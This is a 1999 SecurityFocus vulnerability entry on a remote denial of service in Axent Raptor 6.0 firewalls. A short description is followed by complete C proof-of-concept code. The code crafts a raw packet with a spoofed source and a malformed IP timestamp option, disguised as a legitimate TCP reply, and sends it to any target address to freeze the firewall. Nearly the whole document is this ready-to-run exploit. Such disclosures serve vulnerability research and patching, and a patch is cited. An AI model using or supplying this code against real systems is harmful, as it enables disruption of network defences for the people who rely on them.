source: http://www.securityfocus.com/bid/736/info

It is possible to remotely lock Axent Raptor firewalls by sending them packets with malformed IP options fields. According to an advisory posted to bugtraq by the perdue CERIAS labs, setting the SECURITY and TIMESTAMP IP options length to 0 can cause an infinite loop to occur within the code that handles the options (resulting in the software freezing). A consequence of this is a remote denial of service. 

/* CUT HERE */

/*
 * 10.26.1999
 * Axent Raptor 6.0 'IP Options DOS' as documented in BugTraq 10.20.1999
 *
 * Proof of Concept by MSG.Net, Inc.
 *
 * Tested on Intel/*BSD systems, your mileage may vary. No warranty.
 * Free to distribute as long as these comments remain intact.
 *
 * Exercises the IP options bug reported in Raptor 6.0, this bug is fixed by
 * an Axent official patch available at:
 *
 *                ftp://ftp.raptor.com/patches/V6.0/6.02Patch/
 *
 *
 *                                      The MSG.Net Firewall Wrecking Crew
 *
 *                                          [kadokev, l^3, strange, vn]
 *
 *                                          Quid custodiet ipsos custodes?
 */

#define __FAVOR_BSD
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include <sys/socket.h>
#include <netinet/in.h>
#include <netinet/in_systm.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <arpa/inet.h>

#define SRC_IP                      htonl(0x0a000001) /* 10.00.00.01 */
#define TCP_SZ                      20
#define IP_SZ                       20
#define PAYLOAD_LEN                 32
#define OPTSIZE                      4
#define LEN (IP_SZ + TCP_SZ + PAYLOAD_LEN + OPTSIZE)


void main(int argc, char *argv[])
{
  int checksum(unsigned short *, int);
  int raw_socket(void);
  int write_raw(int, unsigned char *, int);
  unsigned long option = htonl(0x44000001);  /* Timestamp, NOP, END */
  unsigned char *p;
  int s, c;
  struct ip *ip;
  struct tcphdr *tcp;

  if (argc != 2) {
    printf("Quid custodiet ipsos custodes?\n");
    printf("Usage: %s <destination IP>\n", argv[0]);
    return;
  }

  p = malloc(1500);
  memset(p, 0x00, 1500);

  if ((s = raw_socket()) < 0)
     return perror("socket");

  ip = (struct ip *) p;
  ip->ip_v    = 0x4;
  ip->ip_hl   = 0x5 + (OPTSIZE / 4);
  ip->ip_tos  = 0x32;
  ip->ip_len  = htons(LEN);
  ip->ip_id   = htons(0xbeef);
  ip->ip_off  = 0x0;
  ip->ip_ttl  = 0xff;
  ip->ip_p    = IPPROTO_TCP;
  ip->ip_sum  = 0;
  ip->ip_src.s_addr = SRC_IP;
  ip->ip_dst.s_addr = inet_addr(argv[1]);


  /* Masquerade the packet as part of a legitimate answer */
  tcp = (struct tcphdr *) (p + IP_SZ + OPTSIZE);
  tcp->th_sport   = htons(80);
  tcp->th_dport   = 0xbeef;
  tcp->th_seq     = 0x12345678;
  tcp->th_ack     = 0x87654321;
  tcp->th_off     = 5;
  tcp->th_flags   = TH_ACK | TH_PUSH;
  tcp->th_win     = htons(8192);
  tcp->th_sum     = 0;

  /* Set the IP options */
  memcpy((void *) (p + IP_SZ), (void *) &option, OPTSIZE);


  c =  checksum((unsigned short *) &(ip->ip_src), 8)
     + checksum((unsigned short *) tcp, TCP_SZ + PAYLOAD_LEN)
     + ntohs(IPPROTO_TCP + TCP_SZ);
  while (c >> 16)   c = (c & 0xffff) + (c >> 16);
  tcp->th_sum = ~c;

  printf("Sending %s -> ", inet_ntoa(ip->ip_src));
  printf("%s\n", inet_ntoa(ip->ip_dst));

  if (write_raw(s, p, LEN) != LEN)
     perror("sendto");
}


int write_raw(int s, unsigned char *p, int len)
{
  struct ip *ip = (struct ip *) p;
  struct tcphdr *tcp;
  struct sockaddr_in sin;

  tcp = (struct tcphdr *) (ip + ip->ip_hl * 4);

  memset(&sin, 0x00, sizeof(sin));
  sin.sin_family      = AF_INET;
  sin.sin_addr.s_addr = ip->ip_dst.s_addr;
  sin.sin_port        = tcp->th_sport;

  return (sendto(s, p, len, 0, (struct sockaddr *) &sin,
                 sizeof(struct sockaddr_in)));
}


int raw_socket(void)
{
  int s, o = 1;

  if ((s = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) < 0)
    return -1;

  if (setsockopt(s, IPPROTO_IP, IP_HDRINCL, (void *) &o, sizeof(o)) < 0)
    return (-1);

  return (s);
}


int checksum(unsigned short *c, int len)
{
  int sum  = 0;
  int left = len;

  while (left > 1) {
    sum += *c++;
    left -= 2;
  }
  if (left)
    sum += *c & 0xff;

  return (sum);
}

/*###EOF####*/

/* CUT HERE */
